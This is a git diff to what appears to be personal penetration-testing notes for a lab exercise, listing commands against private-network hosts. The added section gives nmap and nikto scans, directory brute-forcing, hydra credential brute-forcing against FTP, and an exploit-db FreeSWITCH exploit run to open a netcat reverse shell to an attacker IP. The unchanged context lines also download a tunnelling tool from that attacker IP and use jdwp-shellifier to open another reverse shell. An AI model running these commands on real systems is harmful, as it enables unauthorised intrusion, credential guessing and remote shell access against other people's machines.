@@ -253,5 +253,32 @@ wget http://192.168.45.234/chisel -O chisel
 python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.234 1234 -e /bin/bash"
 # trigger with 
 nc 127.0.0.1 5000
+```
+
+.151
+```
+nmap 192.168.190.151
+nmap -sT -A -p 80,3389,8021 192.168.190.151
+nmap -p 1000-10000 192.168.190.150
+nikto -host 192.168.190.151 -port 80
+sudo nmap -O 192.168.190.150 --osscan-guess
+sudo nmap -sU --open -p 161 192.168.190.151
+sudo nmap -sV -p 80 --script "vuln" 192.168.190.151
+
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.190.151:80
+gobuster dir -u http://192.168.211.151 -w /usr/share/wordlists/dirb/common.txt
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --url http://192.168.190.151
+
+# enumerate ftp
+nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.190.151
+
+# format of wordlist is user:password, so use -C option
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.190.151 ftp -s 8021
+
+# from nmap we discover that there's some interesting text so google for that - reeswitch-event FreeSWITCH mod_event_socket
+# find exploit: https://www.exploit-db.com/exploits/47799
+searchsploit -m 47799
+python3 47799.py 192.168.190.151 whoami 
+python3 47799.py 192.168.190.151 "busybox nc 192.168.45.234 1234 -e /bin/bash"
 
 ```
